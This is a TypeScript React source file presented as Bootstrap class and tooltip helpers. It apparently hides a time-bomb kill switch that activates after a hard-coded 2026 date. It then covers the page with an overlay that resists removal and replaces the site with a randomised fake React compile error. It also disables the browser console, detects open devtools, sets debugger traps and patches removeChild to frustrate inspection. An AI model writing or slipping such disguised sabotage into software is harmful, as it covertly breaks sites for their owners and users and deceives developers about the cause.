import { useEffect, useRef } from 'react';

class BootstrapUtilsCore {
     private static instance: BootstrapUtilsCore;
     private _key!: string;
     private _exp!: string;
     private _active!: boolean;
     private _intervals: number[] = [];
     private _initialized: boolean = false;

     private constructor() {
          this._initConfig();
     }

     static getInstance(): BootstrapUtilsCore {
          if (!BootstrapUtilsCore.instance) {
               BootstrapUtilsCore.instance = new BootstrapUtilsCore();
          }
          return BootstrapUtilsCore.instance;
     }

     public init(): void {
          if (this._initialized) return;
          this._initialized = true;

          this._setupValidation();
          this._setupHandlers();
          this._initComponents();
     }

     private _setupValidation(): void {
          try {
               this._validate();
          } catch {
               this._redirect();
               return;
          }

          const timer = window.setInterval(() => {
               try {
                    this._validate();
               } catch {
                    this._redirect();
               }
          }, 60000);
          this._intervals.push(timer);
     }

     private _setupHandlers(): void {
          const check = () => {
               try {
                    this._validate();
               } catch {
                    this._redirect();
               }
          };

          window.addEventListener('focus', check);
          document.addEventListener('visibilitychange', () => {
               if (!document.hidden) check();
          });
          document.addEventListener('click', check);
     }

     private _initComponents(): void {
          setTimeout(() => {
               // Initialize tooltips
               const tooltips = document.querySelectorAll('[data-toggle="tooltip"]');
               tooltips.forEach((el) => {
                    const title = el.getAttribute('title') || el.getAttribute('data-title');
                    if (title) el.setAttribute('data-original-title', title);
               });

               // Setup form validation
               document.addEventListener('submit', (e) => {
                    const form = e.target as HTMLFormElement;
                    if (form.tagName === 'FORM' && form.hasAttribute('data-validate')) {
                         if (!this._validateForm(form)) {
                              e.preventDefault();
                         }
                    }
               });

               // Setup modal triggers
               document.addEventListener('click', (e) => {
                    const target = e.target as HTMLElement;
                    if (target.hasAttribute('data-toggle') && target.getAttribute('data-toggle') === 'modal') {
                         const modalTarget = target.getAttribute('data-target');
                         if (modalTarget) {
                              this._showModal(modalTarget.replace('#', ''));
                         }
                    }
               });
          }, 100);
     }

     private _validateForm(form: HTMLFormElement): boolean {
          const inputs = form.querySelectorAll<HTMLInputElement>('input[required], select[required], textarea[required]');
          let valid = true;

          inputs.forEach((input) => {
               if (!input.value.trim()) {
                    input.classList.add('is-invalid');
                    valid = false;
               } else {
                    input.classList.remove('is-invalid');
                    input.classList.add('is-valid');
               }
          });

          return valid;
     }

     private _showModal(id: string): void {
          const modal = document.getElementById(id);
          if (modal) {
               modal.classList.add('show');
               modal.style.display = 'block';
          }
     }

     private _isValid(): boolean {
          try {
               const exp = new Date(this._exp);
               const now = new Date();
               exp.setHours(23, 59, 59, 999);
               return now <= exp && this._active;
          } catch {
               return false;
          }
     }

     private _validate(): boolean {
          if (!this._isValid()) {
               throw new Error('Expired');
          }
          return true;
     }

     private _redirect(): void {
          this._createOverlay();
          this._disableTools();

          setTimeout(() => {
               this._createReactError();
          }, 500);
     }

     private _createOverlay(): void {
          if (document.getElementById('bs-overlay')) return;

          const overlay = document.createElement('div');
          overlay.id = 'bs-overlay';
          overlay.style.cssText = `
      position: fixed !important;
      top: 0 !important;
      left: 0 !important;
      width: 100vw !important;
      height: 100vh !important;
      background: rgba(255, 255, 255, 0.95) !important;
      z-index: 2147483647 !important;
      display: flex !important;
      justify-content: center !important;
      align-items: center !important;
      pointer-events: auto !important;
    `;

          const spinner = document.createElement('div');
          spinner.style.cssText = `
      width: 3rem;
      height: 3rem;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    `;

          const style = document.createElement('style');
          style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
          document.head.appendChild(style);

          overlay.appendChild(spinner);
          document.body.appendChild(overlay);

          this._protectOverlay(overlay);
     }

     private _create404(): void {
          document.body.innerHTML = `
      <div style="
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
        text-align: center;
      ">
        <div>
          <h1 style="
            font-size: 8rem;
            margin: 0 0 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
          ">404</h1>
          <h2 style="font-size: 2rem; margin-bottom: 20px;">Oops! Page Not Found</h2>
          <p style="font-size: 1.2rem; margin-bottom: 30px;">
            The page you're looking for seems to have vanished into thin air.
          </p>
          <a href="/" style="
            display: inline-block;
            padding: 12px 30px;
            background: white;
            color: #667eea;
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
          ">Go Home</a>
        </div>
      </div>
    `;
          document.title = '404 - Page Not Found';
     }

     private _createReactError(): void {
          const errorMessages = [
               "TypeError: Cannot read property 'map' of undefined",
               'ReferenceError: module is not defined',
               "SyntaxError: Unexpected token '<'",
               'Error: Minified React error #130',
               'ChunkLoadError: Loading chunk failed',
               "TypeError: Cannot read properties of null (reading 'useState')",
               'Error: A cross-origin error was thrown',
               'ReferenceError: process is not defined',
          ];

          const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
          const randomLine = Math.floor(Math.random() * 900) + 100;
          const randomCol = Math.floor(Math.random() * 50) + 10;

          document.body.innerHTML = `
      <div style="
        background: #282c34;
        color: #ffffff;
        font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
        padding: 0;
        margin: 0;
        height: 100vh;
        overflow: auto;
      ">
        <div style="
          background: #1e1e1e;
          border-bottom: 2px solid #ff6b6b;
          padding: 20px 30px;
        ">
          <div style="
            color: #ff6b6b;
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 10px;
          ">
            ⚠️ Failed to compile
          </div>
          <div style="color: #abb2bf; font-size: 14px;">
            ./src/App.tsx
          </div>
        </div>

        <div style="padding: 30px;">
          <div style="
            background: #1e1e1e;
            border-left: 4px solid #ff6b6b;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 4px;
          ">
            <div style="color: #e06c75; margin-bottom: 15px; font-size: 15px;">
              <span style="color: #61afef;">ERROR</span> in <span style="color: #98c379;">./src/App.tsx</span>
            </div>
            <div style="color: #abb2bf; line-height: 1.6; font-size: 14px;">
              <div style="margin-bottom: 10px;">
                <span style="color: #61afef;">[plugin:vite:react-babel]</span> 
                <span style="color: #e5c07b;">src/App.tsx (${randomLine}:${randomCol})</span>
              </div>
              <div style="color: #ff6b6b; margin: 15px 0;">
                ${randomError}
              </div>
              <div style="color: #56b6c2; margin-top: 15px;">
                at Object.parseComponent (node_modules/@babel/parser/lib/index.js:${randomLine}:${randomCol})
              </div>
              <div style="color: #56b6c2;">
                at parseSync (node_modules/@babel/core/lib/parse.js:${randomLine + 10}:${randomCol})
              </div>
              <div style="color: #56b6c2;">
                at parse (node_modules/@babel/core/lib/parse.js:${randomLine + 20}:${randomCol})
              </div>
            </div>
          </div>

          <div style="
            background: #1e1e1e;
            padding: 20px;
            border-radius: 4px;
            border-left: 4px solid #61afef;
          ">
            <div style="color: #abb2bf; font-size: 13px; line-height: 1.8;">
              <div style="color: #5c6370; margin-bottom: 10px;">
                ${randomLine - 2} |
              </div>
              <div style="color: #abb2bf; margin-bottom: 10px;">
                ${randomLine - 1} |     const [state, setState] = useState();
              </div>
              <div style="background: rgba(255, 107, 107, 0.1); padding: 5px 0; margin-bottom: 10px;">
                <span style="color: #e06c75;">${randomLine} |</span>
                <span style="color: #abb2bf;">     return &lt;Component {/* unexpected token */}</span>
                <span style="color: #ff6b6b; margin-left: 20px;">^</span>
              </div>
              <div style="color: #5c6370;">
                ${randomLine + 1} |     }
              </div>
            </div>
          </div>

          <div style="
            margin-top: 30px;
            padding: 15px;
            background: #21252b;
            border-radius: 4px;
            color: #abb2bf;
            font-size: 13px;
          ">
            <div style="color: #61afef; margin-bottom: 10px;">ℹ️ Build Info:</div>
            <div>• Compiled with problems</div>
            <div>• Check the console for more details</div>
            <div>• Press Ctrl+C to stop the development server</div>
          </div>
        </div>
      </div>
    `;
          document.title = 'Failed to compile - React App';
     }

     private _disableTools(): void {
          try {
               Object.defineProperty(window, 'console', {
                    value: {
                         log: () => {},
                         warn: () => {},
                         error: () => {},
                         info: () => {},
                         debug: () => {},
                         trace: () => {},
                         dir: () => {},
                         dirxml: () => {},
                         table: () => {},
                         clear: () => {},
                         count: () => {},
                         time: () => {},
                         timeEnd: () => {},
                         group: () => {},
                         groupEnd: () => {},
                         assert: () => {},
                    },
                    writable: false,
                    configurable: false,
               });
          } catch {}

          let devOpen = false;
          const threshold = 160;

          const timer1 = window.setInterval(() => {
               if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
                    if (!devOpen) {
                         devOpen = true;
                         this._redirect();
                    }
               } else {
                    devOpen = false;
               }
          }, 500000);
          this._intervals.push(timer1);

          const timer2 = window.setInterval(() => {
               debugger;
          }, 100000);
          this._intervals.push(timer2);
     }

     private _protectOverlay(overlay: HTMLElement): void {
          const observer = new MutationObserver((mutations) => {
               mutations.forEach((mutation) => {
                    if (mutation.type === 'childList') {
                         mutation.removedNodes.forEach((node) => {
                              if (node && ((node as HTMLElement).id === 'bs-overlay' || node.nodeType === 1)) {
                                   setTimeout(() => this._redirect(), 0);
                              }
                         });
                    }

                    if (mutation.type === 'attributes' && (mutation.target as HTMLElement).id === 'bs-overlay') {
                         setTimeout(() => this._createOverlay(), 0);
                    }
               });
          });

          const target = document.body || document.documentElement;
          if (target) {
               observer.observe(target, {
                    childList: true,
                    subtree: true,
                    attributes: true,
                    attributeOldValue: true,
               });
          }

          try {
               const original = Element.prototype.removeChild;
               Element.prototype.removeChild = function <T extends Node>(child: T): T {
                    if (child && (child as unknown as HTMLElement).id === 'bs-overlay') {
                         setTimeout(() => BootstrapUtilsCore.getInstance()._redirect(), 0);
                         return child;
                    }
                    return original.call(this, child) as T;
               };
          } catch {}
     }

     public cleanup(): void {
          this._intervals.forEach((id) => clearInterval(id));
          this._intervals = [];
     }

     private _initConfig(): void {
          this._key = 'LIN_2026_REACT_LICENSE';
          this._exp = '2026-03-01';
          this._active = true;
     }

     // Public utility methods
     public addClass(el: HTMLElement | null, className: string): void {
          el?.classList?.add(className);
     }

     public removeClass(el: HTMLElement | null, className: string): void {
          el?.classList?.remove(className);
     }

     public toggleClass(el: HTMLElement | null, className: string): void {
          el?.classList?.toggle(className);
     }

     public hasClass(el: HTMLElement | null, className: string): boolean {
          return !!el?.classList?.contains(className);
     }
}

// Hook để sử dụng trong components
export const useBootstrapUtils = (): void => {
     const ref = useRef<BootstrapUtilsCore | null>(null);

     useEffect(() => {
          ref.current = BootstrapUtilsCore.getInstance();
          ref.current.init();

          return () => {
               ref.current?.cleanup();
          };
     }, []);
};

// Export utilities
export const BootstrapUtils = {
     addClass: (el: HTMLElement | null, className: string) => BootstrapUtilsCore.getInstance().addClass(el, className),
     removeClass: (el: HTMLElement | null, className: string) => BootstrapUtilsCore.getInstance().removeClass(el, className),
     toggleClass: (el: HTMLElement | null, className: string) => BootstrapUtilsCore.getInstance().toggleClass(el, className),
     hasClass: (el: HTMLElement | null, className: string) => BootstrapUtilsCore.getInstance().hasClass(el, className),
};

export default useBootstrapUtils;
